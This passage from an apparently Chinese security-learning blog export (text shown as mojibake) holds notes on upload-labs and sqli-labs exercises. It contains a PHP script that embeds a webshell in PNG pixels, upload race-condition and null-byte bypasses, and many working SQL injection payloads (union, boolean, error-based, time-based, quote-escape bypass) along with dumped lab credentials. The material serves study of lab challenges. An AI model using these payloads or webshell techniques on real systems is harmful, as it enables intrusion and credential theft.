èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– <a href="https://www.w3school.com.cn/php/func_math_mt_srand.asp">mt_srand()</a> å‡½æ•°ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ï¼ŒçŽ°åœ¨å·²è‡ªåŠ¨å®Œæˆã€‚æ‰€ä»¥è¿™ä¸ªå‡½æ•°çŽ°åœ¨æ¥è¯´åº”è¯¥æ²¡ç”¨ã€‚</p><h4 id="strval-mixed-var"><a href="#strval-mixed-var" class="headerlink" title="#strval( mixed $var)"></a>#strval( mixed $var)</h4><p>ç”¨äºŽèŽ·å–å˜é‡çš„å­—ç¬¦ä¸²å€¼ã€‚</p><p>$var: å¯ä»¥æ˜¯ä»»ä½•æ ‡é‡ç±»åž‹ï¼Œä½†ä¸èƒ½æ˜¯æ•°ç»„æˆ–å¯¹è±¡ã€‚</p><h4 id="image"><a href="#image" class="headerlink" title="#image__()"></a>#image__()</h4><p>å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶ã€‚</p><p>imagegif()ï¼š       ä»¥ GIF æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶<br>imagejpeg()ï¼š    ä»¥ JPEG æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶<br>imagepng()ï¼š     ä»¥ PNG æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶<br>imagewbmp()ï¼šä»¥ WBMP æ ¼å¼å°†å›¾åƒè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–æ–‡ä»¶</p><pre><code>&lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, â€‹          0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, â€‹          0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, â€‹          0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, â€‹          0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, â€‹          0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, â€‹          0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, â€‹          0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) &amp;#123;   $r = $p[$y];   $g = $p[$y+1];   $b = $p[$y+2];   $color = imagecolorallocate($img, $r, $g, $b);   imagesetpixel($img, round($y / 3), 0, $color); &amp;#125;   imagepng($img,'./fox.png');   ?&gt;</code></pre><pre><code> php pass17.php pass17.png</code></pre><p>è¿™ä¸ªä¸€å¥è¯æœ¨é©¬éœ€è¦åŒæ—¶ä¼ å‚GETå‚æ•°0å’ŒPOSTå‚æ•°1æ‰è¡Œ</p><p>ç”¨èœåˆ€è¿žæŽ¥file=./upload/1234.png&amp;0=assert  å¯†ç æ˜¯1 å°±å¯ä»¥äº†</p><p>#è¿™é‡Œä¸èƒ½ç”¨evalå‡½æ•° </p><p>#åªæœ‰php.iniä¸­å¼€å¯short_open_tag æ‰å¯ä»¥ç”¨&lt;?  ä»£æ›¿ &lt;?php  , ç”¨&lt;?= ä»£æ›¿ &lt;? echo</p><p>#åœ¨PHP7.1ç‰ˆæœ¬ä»¥åŽï¼Œassert()é»˜è®¤ä¸å†å¯ä»¥æ‰§è¡Œä»£ç  å°±åƒevalä¸€æ ·ã€‚æ‰€ä»¥è¯´ assertä¹Ÿå’Œevalä¸€æ ·ä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚</p><p>è¿™å…³ä¸ä¼š</p><p><a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p><h2 id="Pass-17-æ¡ä»¶ç«žäº‰"><a href="#Pass-17-æ¡ä»¶ç«žäº‰" class="headerlink" title="Pass-17 æ¡ä»¶ç«žäº‰"></a>Pass-17 æ¡ä»¶ç«žäº‰</h2><pre><code>$is_upload = false;$msg = null;if(isset($_POST['submit'])){    $ext_arr = array('jpg','png','gif');    $file_name = $_FILES['upload_file']['name'];    $temp_file = $_FILES['upload_file']['tmp_name'];    $file_ext = substr($file_name,strrpos($file_name,".")+1);    $upload_file = UPLOAD_PATH . '/' . $file_name;    if(move_uploaded_file($temp_file, $upload_file)){        if(in_array($file_ext,$ext_arr)){             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        }else{            $msg = "åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»åž‹æ–‡ä»¶ï¼";            unlink($upload_file);        }    }else{        $msg = 'ä¸Šä¼ å‡ºé”™ï¼';    }}</code></pre><p>è¿™é‡Œæ˜¯æ¡ä»¶ç«žäº‰ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶åŽåˆ¤æ–­æ–‡ä»¶åŽç¼€æ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œå¦‚æžœåœ¨åˆ™é‡å‘½åï¼Œå¦åˆ™åˆ é™¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ 1.phpåªéœ€è¦åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®å³å¯ï¼Œå¯ä»¥åˆ©ç”¨burpçš„intruderæ¨¡å—ä¸æ–­ä¸Šä¼ ï¼Œç„¶åŽæˆ‘ä»¬ä¸æ–­çš„è®¿é—®åˆ·æ–°è¯¥åœ°å€å³å¯</p><h2 id="Pass-18-æ¡ä»¶ç«žäº‰"><a href="#Pass-18-æ¡ä»¶ç«žäº‰" class="headerlink" title="Pass-18 æ¡ä»¶ç«žäº‰"></a>Pass-18 æ¡ä»¶ç«žäº‰</h2><pre><code>//index.php$is_upload = false;$msg = null;if (isset($_POST['submit'])){    require_once("./myupload.php");    $imgFileName =time();    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) {        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = 'æ–‡ä»¶å·²ç»è¢«ä¸Šä¼ ï¼Œä½†æ²¡æœ‰é‡å‘½åã€‚';            break;         case -1:            $msg = 'è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å­˜å‚¨ç›®å½•ã€‚';            break;         case -2:            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ ç›®å½•ä¸å¯å†™ã€‚';            break;         case -3:            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œæ— æ³•ä¸Šä¼ è¯¥ç±»åž‹æ–‡ä»¶ã€‚';            break;         case -4:            $msg = 'ä¸Šä¼ å¤±è´¥ï¼Œä¸Šä¼ çš„æ–‡ä»¶è¿‡å¤§ã€‚';            break;         case -5:            $msg = 'ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚';            break;         case -6:            $msg = 'æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚';            break;              default:            $msg = 'æœªçŸ¥é”™è¯¯ï¼';            break;    }}//myupload.phpclass MyUpload{..................   var $cls_arr_ext_accepted = array(      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",      ".html", ".xml", ".tiff", ".jpeg", ".png" );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir ){    $ret = $this-&gt;isUploadedFile();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );    }    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );    }    $ret = $this-&gt;checkExtension();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );    }    $ret = $this-&gt;checkSize();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );        }    // if flag to check if the file exists is set to 1    if( $this-&gt;cls_file_exists == 1 ){      $ret = $this-&gt;checkFileExists();      if( $ret != 1 ){        return $this-&gt;resultUpload( $ret );          }    }    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 ){      return $this-&gt;resultUpload( $ret );        }    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 ){      $ret = $this-&gt;renameFile();      if( $ret != 1 ){        return $this-&gt;resultUpload( $ret );          }    }    // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( "SUCCESS" );  }.................. };</code></pre><p>ä¹Ÿå­˜åœ¨æ¡ä»¶ç«žäº‰çš„é—®é¢˜ï¼Œä¸è¿‡è¿™é¢˜å¯¹æ–‡ä»¶åŽç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åŽä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¸æ–­ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç”±äºŽæ¡ä»¶ç«žäº‰å¯èƒ½æ¥ä¸åŠé‡å‘½åï¼Œä»Žè€Œä¸Šä¼ æˆåŠŸã€‚</p><p>ä½¿ç”¨ä¸Šä¸€å…³çš„æœ¨é©¬æ–‡ä»¶ï¼Œç™½åå•ä¸­å…è®¸åŽç¼€ä¸º7zçš„æ–‡ä»¶ä¸Šä¼ </p><p>æˆ‘ä»¬å¯ä»¥æž„é€ 1.php.7zæ–‡ä»¶ï¼Œåœ¨Apacheä¸­å…è®¸å¤šåŽç¼€ï¼Œå¹¶ä¸”ä»Žå³å‘å·¦è§£æž</p><p>å½“æˆ‘ä»¬è®¿é—®1.php.7zè§£æžæˆphpæ–‡ä»¶ï¼Œæ ¹æ®æ–‡ä»¶ä»£ç ç”Ÿæˆshell.php</p><h2 id="Pass-19-00æˆªæ–­"><a href="#Pass-19-00æˆªæ–­" class="headerlink" title="Pass-19 00æˆªæ–­"></a>Pass-19 00æˆªæ–­</h2><pre><code>$is_upload = false;$msg = null;if (isset($_POST['submit'])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");        $file_name = $_POST['save_name'];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) {            $temp_file = $_FILES['upload_file']['tmp_name'];            $img_path = UPLOAD_PATH . '/' .$file_name;            if (move_uploaded_file($temp_file, $img_path)) {                 $is_upload = true;            }else{                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';            }        }else{            $msg = 'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»åž‹æ–‡ä»¶ï¼';        }    } else {        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';    }}</code></pre><p>å‘çŽ°move_uploaded_file()å‡½æ•°ä¸­çš„img_pathæ˜¯ç”±postå‚æ•°save_nameæŽ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ï¼Œæ–¹æ³•åŒpass-12</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:é—­åˆæ–¹å¼çš„åˆ¤æ–­</title>
      <link href="2021/07/16/sql-bi-he-fang-shi-de-pan-duan/"/>
      <url>2021/07/16/sql-bi-he-fang-shi-de-pan-duan/</url>
      
        <content type="html"><![CDATA[<p>å½’çº³ï¼š</p><p>åˆ¤æ–­é—­åˆæ–¹å¼ï¼Œç›®å‰æŽŒæ¡çš„é—­åˆæ–¹å¼ä¸ºå•å¼•å·â€™â€™ï¼Œå•å¼•å·æ‹¬å·(â€™â€™)ï¼ŒåŒå¼•å·â€â€ï¼ŒåŒå¼•å·æ‹¬å·(â€œâ€)</p><p>å½“å•å¼•å·æˆ–è€…åŒå¼•å·å‡ºçŽ°å›žæ˜¾æˆ–è€…è¯­æ³•é”™è¯¯æ—¶ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦å¸¦æ‹¬å·å‘¢ï¼Ÿ</p><p>æŠ„è¢­ä¸€æ³¢å¤§ç¥žçš„åˆ¤æ–­æ–¹å¼</p><p>é‡åˆ°SQLæ³¨å…¥ç¬¬ä¸€æ­¥åˆ¤æ–­é—­åˆï¼š<br> é¦–å…ˆå°è¯•ï¼š</p><pre><code>?id=1â€™?id=1â€12</code></pre><p>1å¦‚æžœéƒ½æŠ¥é”™ï¼Œåˆ™ä¸ºæ•´å½¢é—­åˆã€‚</p><p>2å¦‚æžœå•å¼•å·æŠ¥é”™ï¼ŒåŒå¼•å·ä¸æŠ¥é”™ã€‚<br> ç„¶åŽå°è¯•</p><pre><code>?id=1' --+?id=1' #12</code></pre><p>æ— æŠ¥é”™åˆ™å•å¼•å·é—­åˆã€‚<br> æŠ¥é”™åˆ™å•å¼•å·åŠ æ‹¬å·ã€‚</p><p>3å¦‚æžœå•å¼•å·ä¸æŠ¥é”™ï¼ŒåŒå¼•å·æŠ¥é”™ã€‚<br> ç„¶åŽå°è¯•</p><pre><code>?id=1" --+?id=1" #12</code></pre><p>æ— æŠ¥é”™åˆ™åŒå¼•å·é—­åˆã€‚<br> æŠ¥é”™åˆ™åŒå¼•å·åŠ æ‹¬å·ã€‚</p><hr><p>1</p><p>è¾“å…¥ï¼ˆå…¶ä¸­id=1,1æ˜¯æ­£ç¡®çš„æ•°æ®åº“å­˜åœ¨çš„å€¼ï¼‰ï¼Œæ­£å¸¸å›žæ˜¾</p><pre><code>?id=1 and true --+æˆ–è€…?id=true and true --+123</code></pre><p>è¾“å…¥ï¼Œé”™è¯¯å›žæ˜¾</p><pre><code>?id=1 and false --+æˆ–è€…?id=true and false --+123</code></pre><p>é‚£ä¹ˆå°±æ˜¯æ•´å½¢é—­åˆ</p><p>2</p><p>è¾“å…¥ï¼ˆå…¶ä¸­id=1,1æ˜¯æ­£ç¡®çš„æ•°æ®åº“å­˜åœ¨çš„å€¼ï¼‰ï¼Œæ­£å¸¸å›žæ˜¾</p><pre><code>?id=1â€™ and true --+æˆ–è€…?id=trueâ€˜ and true --+123</code></pre><p>è¾“å…¥ï¼Œé”™è¯¯å›žæ˜¾</p><pre><code>?id=1â€™ and false --+æˆ–è€…?id=trueâ€˜ and false --+123</code></pre><p>é‚£ä¹ˆå°±æ˜¯å•å¼•å·é—­åˆï¼Œå…¶ä»–ç¬¦å·åŒç†</p><h3 id="order-byé—­åˆæ–¹å¼åˆ¤æ–­"><a href="#order-byé—­åˆæ–¹å¼åˆ¤æ–­" class="headerlink" title="order byé—­åˆæ–¹å¼åˆ¤æ–­"></a>order byé—­åˆæ–¹å¼åˆ¤æ–­</h3><p>æ˜¯å¦å­˜åœ¨æ³¨å…¥ï¼Œè‹¥ç»“æžœä¸åŒï¼Œå°±æ˜¯å­˜åœ¨æ³¨å…¥ï¼Œå¯ä»¥å¾€ä¸‹è¿›è¡Œï¼Œè‹¥ç»“æžœç›¸åŒï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦æ³¨å…¥</p><pre><code>?sort=1 desc?sort=1 asc12</code></pre><p>æ˜¯å¦ä¸ºæ•°å­—æ³¨å…¥ï¼Œæ˜¾ç¤ºç»“æžœä¸åŒï¼Œåˆ™ä¸ºæ•°å­—æ³¨å…¥ï¼Œç›¸åŒï¼Œåˆ™å¾€ä¸‹è¿›è¡Œ</p><pre><code>?sort=right(version(),1)?sort=left(version(),1)12</code></pre><p>æ˜¯å¦ä¸ºå¸ƒå°”ç±»åž‹ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥å’Œå»¶æ—¶æ³¨å…¥</p><pre><code>?sort=rand(true)?sort=rand(false)12</code></pre><p>æ˜¯å¦ä¸ºå­—ç¬¦æ³¨å…¥ï¼Œå›žæ˜¾ç»“æžœä¸ä¸€æ ·ï¼Œå°±è¯´æ˜Žé—­åˆæ–¹å¼ä¸ºå•å¼•å·ï¼Œå…¶ä»–é—­åˆæ–¹å¼ï¼ˆåŒå¼•å·ï¼Œå•å¼•å·æ‹¬å·ï¼ŒåŒå¼•å·æ‹¬å·ï¼‰åŒç†</p><pre><code>?sort=1?sort=1'12</code></pre><h3 id="å•å¼•å·è½¬ä¹‰ç»•è¿‡"><a href="#å•å¼•å·è½¬ä¹‰ç»•è¿‡" class="headerlink" title="å•å¼•å·è½¬ä¹‰ç»•è¿‡"></a>å•å¼•å·è½¬ä¹‰ç»•è¿‡</h3><p>å½“æ—¶ç”¨å•å¼•å·â€™ï¼Œä»£ç è½¬ä¹‰ä¸º\â€™ï¼Œå°±ä½¿ç”¨å¦‚ä¸‹æ–¹å¼æ›¿æ¢æŽ‰å•å¼•å·</p><pre><code>%df%27ï¿½'%EF%BF%BD123</code></pre><p>ä¸‡èƒ½å¯†ç </p><pre><code>ï¿½' and1=1 #</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLï¼šè”åˆæ³¨å…¥</title>
      <link href="2021/07/16/sql-lian-he-zhu-ru/"/>
      <url>2021/07/16/sql-lian-he-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>æ“ä½œæ˜¯è¿™æ ·ï¼š</p><p>?id=-1â€™union select 1,group_concat(schema_name),3 from information_schema.schemataâ€“+<br>Your Login name:information_schema,challenges,mysql,performance_schema,security,test<br>Your Password:3</p><p>?id=-1â€™union select 1, 2, group_concat(schema_name) from information_schema.schemataâ€“+<br>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security,test</p><p>?id=-1â€™union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=â€™securityâ€™â€“+<br>Your Login name:emails,referers,uagents,users<br>Your Password:3</p><p>?id=-1â€™union select 1,group_concat(column_name),3 from information_schema.columns where table_name=â€™usersâ€™â€“+<br>Your Login name:id,username,password<br>Your Password:3</p><p>?id=99â€™union select 1,group_concat(concat_ws(â€˜:â€™,username,password)),3 from security.usersâ€“+<br>Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,supefrman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4<br>Your Password:3</p><p>ç»“æžœæ˜¯è¿™æ ·ï¼š</p><p>![]J5EF4ELJ<del>C[9C70[$X]4Y8](D:\blog\source_posts\SQLç¬¬ä¸€å…³]J5EF4ELJ</del>C[9C70[$X]4Y8.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:ç­”æ¡ˆï¼ˆç”¨äºŽç ´è§£çš„è¯­å¥ï¼‰</title>
      <link href="2021/07/16/sql-da-an-yong-yu-po-jie-de-yu-ju/"/>
      <url>2021/07/16/sql-da-an-yong-yu-po-jie-de-yu-ju/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ã€è”åˆæ³¨å…¥</p><pre><code>?id=-1'union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><pre><code>?id=-1 union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><pre><code>?id=-1') union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><pre><code>?id=-1") union select 1,group_concat(username,0x3a,password),3 from users--+</code></pre><p>äºŒã€å¸ƒå°”æ³¨å…¥</p><pre><code>?id=1 and ascii(substr((select username from users limit 0,1),1,1))&gt;67 --+</code></pre><pre><code>?id=1 and ascii(substr((select password from users limit 0,1),1,1))&gt;67 --+</code></pre><p>ä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦å¾—å‡ºç­”æ¡ˆ<br>ä¸‰ã€æ­£åˆ™æ³¨å…¥ï¼ˆåˆ¤æ–­)</p><pre><code>id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1) --+</code></pre><p>å››ã€äºŒæ¬¡æŸ¥è¯¢æ³¨å…¥</p><pre><code>?id=1' union SELECT null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><pre><code>?id=1' union SELECT null,count(*),concat((select password from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</code></pre><p>äº”ã€æŠ¥é”™æ³¨å…¥<br>â‘ extractvalueæ³¨å…¥</p><pre><code>?id=1' and extractvalue(1,concat(0x23,(select username from users limit 0,1)))--+</code></pre><p>â‘¡updatexmlæ³¨å…¥</p><pre><code>?id=1' and updatexml(1,concat(0x23,(select username from users limit 0,1)),1)--+</code></pre><p>â‘¢doubleæº¢å‡ºæ³¨å…¥</p><pre><code>?id=1' union select (exp(~(select * from (select user())a))),2,3--+</code></pre><p>â‘£brgintæº¢å‡ºæ³¨å…¥</p><pre><code>?id=1' union select 1,2,3 from (select  name_const(version(),1),name_const(version(),1))x --+</code></pre><p>å…­ã€å»¶æ—¶æ³¨å…¥<br>â‘ sleep()å‡½æ•°</p><pre><code>?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p>â‘¡benchmark()</p><pre><code>?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+</code></pre><p>select group_concat(username,0x3a,password) from users</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:åŸºäºŽextractvalue()å’Œupdatexml()çš„æŠ¥é”™æ³¨å…¥</title>
      <link href="2021/07/16/sql-ji-yu-extractvalue-he-updatexml-de-bao-cuo-zhu-ru/"/>
      <url>2021/07/16/sql-ji-yu-extractvalue-he-updatexml-de-bao-cuo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>extractvalue() :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°</p><p>å…¶å®žå°±æ˜¯ç›¸å½“äºŽæˆ‘ä»¬ç†Ÿæ‚‰çš„HTMLæ–‡ä»¶ä¸­ç”¨ </p><div><p><a>æ ‡ç­¾æŸ¥æ‰¾å…ƒç´ ä¸€æ ·</a></p><p>è¯­æ³•ï¼šextractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)</p><p>ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æžœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›žæˆ‘ä»¬å†™å…¥çš„éžæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéžæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚</p><p>æ­£å¸¸æŸ¥è¯¢ ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®æ ¼å¼ ä¸º /xxx/xx/xx/xx ,å³ä½¿æŸ¥è¯¢ä¸åˆ°ä¹Ÿä¸ä¼šæŠ¥é”™</p><pre><code>select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,â€™/x/xxâ€™))</code></pre><p>ä½¿ç”¨concat()æ‹¼æŽ¥ â€˜ / â€˜ æ•ˆæžœç›¸åŒï¼Œ</p><pre><code>select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,concat(â€˜/â€™,(select database()))))</code></pre><p>è¿™é‡Œåœ¨â€™anythingâ€™ä¸­æŸ¥è¯¢ä¸åˆ° ä½ç½®æ˜¯ /database()çš„å†…å®¹ï¼Œ</p><p>ä½†ä¹Ÿæ²¡æœ‰è¯­æ³•é”™è¯¯ï¼Œä¸ä¼šæŠ¥é”™ï¼Œä¸‹é¢æ•…æ„å†™å…¥è¯­æ³•é”™è¯¯ï¼š</p><pre><code>select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,concat(â€˜~â€™,(select database()))))</code></pre><p>æŠ¥é”™ï¼š</p><pre><code>#1105-XAPTH syntax error:'~security'</code></pre><p>å¯ä»¥çœ‹å‡ºï¼Œä»¥~å¼€å¤´çš„å†…å®¹ä¸æ˜¯xmlæ ¼å¼çš„è¯­æ³•ï¼ŒæŠ¥é”™ï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ— æ³•è¯†åˆ«çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œè¿™æ ·å°±è¾¾åˆ°äº†ç›®çš„ã€‚</p><p>æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œextractvalue()èƒ½æŸ¥è¯¢å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œå°±æ˜¯è¯´å¦‚æžœæˆ‘ä»¬æƒ³è¦çš„ç»“æžœè¶…è¿‡32ï¼Œå°±éœ€è¦ç”¨substring()å‡½æ•°æˆªå–ï¼Œä¸€æ¬¡æŸ¥çœ‹32ä½</p><p>è¿™é‡ŒæŸ¥è¯¢å‰5ä½ç¤ºæ„:</p><pre><code>select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,concat(â€˜#â€™,substring(hex((select database())),1,5))))</code></pre><p>æŠ¥é”™ï¼š</p><pre><code>#1105â€”XPATH syntax error:'#73656'</code></pre><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>updatexml()å‡½æ•°ä¸Žextractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚</p><p>è¯­æ³•updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)</p><pre><code>select username from security.user where id=1 and (updatexml(â€˜anythingâ€™,â€™/xx/xxâ€™,â€™anythingâ€™))</code></pre><p>æŠ¥é”™æ–¹å¼ç›¸åŒï¼š</p><pre><code>select username from security.user where id=1 and (updatexml(â€˜anythingâ€™,concat(â€˜~â€™,(select database())),â€™anythingâ€™))</code></pre><p>æŠ¥é”™ï¼š</p><pre><code>#1105-XPATH syntax error:'~security'</code></pre><p>åŒæ ·æ˜¯32ä½æŸ¥è¯¢</p></div><p></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQLï¼šåœ¨SQL serverçš„æ³¨å…¥</title>
      <link href="2021/07/16/sql-zai-sql-server-de-zhu-ru/"/>
      <url>2021/07/16/sql-zai-sql-server-de-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>ä¸€ã€æµ‹è¯•SQLæ³¨å…¥çš„å­˜åœ¨ï¼š</p><p>æµ‹è¯•æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>1.æ•°å­—åž‹æ³¨å…¥</p><p>â‘ HTTP://<a href="http://www.xxser.com/test.php?id=8'">www.xxser.com/test.php?id=8'</a></p><p>SQLè¯­å¥ä¸º: select * from table where id=8â€™ï¼Œè¿™æ ·çš„è¯­å¥è‚¯å®šä¼šå‡ºé”™ï¼Œå¯¼è‡´è„šæœ¬ç¨‹åºæ— æ³•ä»Žæ•°æ®åº“ä¸­æ­£å¸¸èŽ·å–æ•°æ®ï¼Œä»Žè€Œä½¿åŽŸæ¥çš„é¡µé¢å‡ºçŽ°å¼‚å¸¸ã€‚</p><p>â‘¡HTTP://<a href="http://www.xxser.com/test.php?id=8">www.xxser.com/test.php?id=8</a> and 1=1</p><p>SQLè¯­å¥ä¸ºselect * from table where id=8 and 1=1,è¯­å¥æ‰§è¡Œæ­£å¸¸ï¼Œè¿”å›žæ•°æ®ä¸ŽåŽŸå§‹è¯·æ±‚æ— ä»»ä½•å·®å¼‚ã€‚</p><p>â‘¢HTTP://<a href="http://www.xxser.com/test.php?id=8">www.xxser.com/test.php?id=8</a> and 1=2</p><p>SQLè¯­å¥å˜ä¸º select * from table where id=8 and 1=2 ,è¯­å¥æ‰§è¡Œæ­£å¸¸ï¼Œä½†å´æ— æ³•æŸ¥è¯¢å‡ºæ•°æ®ï¼Œå› ä¸ºâ€œ and 1=2 